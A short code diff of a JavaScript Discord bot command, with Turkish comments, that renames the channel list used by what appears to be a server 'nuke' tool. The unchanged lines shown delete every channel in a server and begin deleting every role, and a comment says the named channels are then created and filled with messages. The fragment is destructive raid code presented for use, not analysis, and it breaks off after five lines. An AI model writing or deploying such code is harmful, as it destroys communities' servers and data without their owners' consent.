@@ -1,5 +1,5 @@
 module.exports.run = async (client, message, args) => {
-    var channelNames =  ["rate","1993"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et!
+    var channelNames =  ["InfinityClient"]; //buraya istediğiniz kadar kanal adı girin hepsini açıp mesaj atıcak 29. satırı kontrol et!
     message.guild.channels.cache.forEach(channel => channel.delete()); // Sunucudaki tüm kanalları siler
     // Deleting every role except for everyone
     message.guild.roles.cache.forEach(role => {
